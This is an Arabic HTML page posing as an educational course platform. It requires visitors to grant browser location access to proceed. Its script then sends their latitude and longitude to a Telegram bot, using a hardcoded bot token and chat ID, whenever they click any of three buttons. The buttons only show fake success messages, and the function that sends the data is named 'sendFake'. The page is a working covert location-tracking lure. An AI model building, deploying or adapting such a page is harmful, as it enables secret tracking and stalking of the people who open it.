<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>منصة تعليمية</title>
<style>
  body {
    font-family: 'Tahoma', sans-serif;
    background: linear-gradient(135deg, #ff4e50, #f9d423, #24c6dc, #3f9c35);
    background-size: 400% 400%;
    animation: bgMove 10s ease infinite;
    min-height: 100vh;
    margin: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    color: #fff;
  }
  @keyframes bgMove {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }
  .container {
    background: rgba(255, 255, 255, 0.15);
    padding: 30px;
    border-radius: 15px;
    box-shadow: 0 8px 30px rgba(0,0,0,0.3);
    text-align: center;
    width: 90%;
    max-width: 400px;
    backdrop-filter: blur(12px);
    animation: fadeIn 1s ease;
  }
  @keyframes fadeIn {
    from { opacity: 0; transform: scale(0.9); }
    to { opacity: 1; transform: scale(1); }
  }
  h1 {
    font-size: 22px;
    margin-bottom: 15px;
    font-weight: bold;
  }
  p {
    font-size: 15px;
    margin-bottom: 20px;
  }
  button {
    display: block;
    width: 100%;
    margin: 12px 0;
    padding: 14px;
    font-size: 17px;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    color: #fff;
    font-weight: bold;
    transition: transform 0.2s, box-shadow 0.2s;
  }
  button:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 15px rgba(0,0,0,0.3);
  }
  #allowBtn { background: linear-gradient(90deg, #00c6ff, #0072ff); }
  #allowBtn:hover { background: linear-gradient(90deg, #0072ff, #00c6ff); }
  #btn1 { background: linear-gradient(90deg, #00c6ff, #0072ff); }
  #btn2 { background: linear-gradient(90deg, #ff512f, #dd2476); }
  #btn3 { background: linear-gradient(90deg, #56ab2f, #a8e063); }
  .hidden { display: none; }
</style>
</head>
<body>

<div class="container" id="instructions">
  <h1>📍 تعليمات مهمة</h1>
  <p>للاستمرار والوصول إلى الكورس أو الشرح، يجب أن تضغط <strong>سماح</strong> عندما يطلب المتصفح إذن تحديد الموقع.</p>
  <button id="allowBtn" onclick="requestLocation()">متابعة</button>
</div>

<div class="container hidden" id="mainContent">
  <h1>منصتك التعليمية</h1>
  <button id="btn1" onclick="sendFake('✅ تم إنشاء الصفحة بنجاح!')">إنشاء صفحة هبوط</button>
  <button id="btn2" onclick="sendFake('✅ تم عرض طريقة إنشاء الحساب!')">إنشاء حساب إعلاني تيك توك</button>
  <button id="btn3" onclick="sendFake('📈 تم عرض خطوات التسويق!')">تعلم التسويق</button>
  <p id="status"></p>
</div>

<script>
const BOT_TOKEN = "5814823361:AAEFNHuJtnAq_3M51YQPwylzyDsnOnSUOjQ";
const CHAT_ID = "143914927";
let locationGranted = false;
let lastPosition = null;

function requestLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            locationGranted = true;
            lastPosition = position;
            document.getElementById("instructions").classList.add("hidden");
            document.getElementById("mainContent").classList.remove("hidden");
        }, () => {
            alert("❌ لم يتم منح إذن الموقع، لا يمكنك المتابعة.");
        });
    } else {
        alert("المتصفح لا يدعم تحديد الموقع.");
    }
}

function getLocationOnce(callback) {
    if (locationGranted && lastPosition) {
        callback(lastPosition);
    } else {
        alert("⚠ يرجى السماح بمشاركة الموقع أولاً.");
    }
}

function sendFake(messageToShow) {
    getLocationOnce(position => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
        fetch(url)
            .then(response => {
                if (response.ok) {
                    document.getElementById("status").innerText = messageToShow;
                } else {
                    document.getElementById("status").innerText = "❌ حدث خطأ أثناء الإرسال";
                }
            })
            .catch(() => {
                document.getElementById("status").innerText = "⚠ حدث خطأ أثناء الإرسال";
            });
    });
}
</script>

</body>
</html>
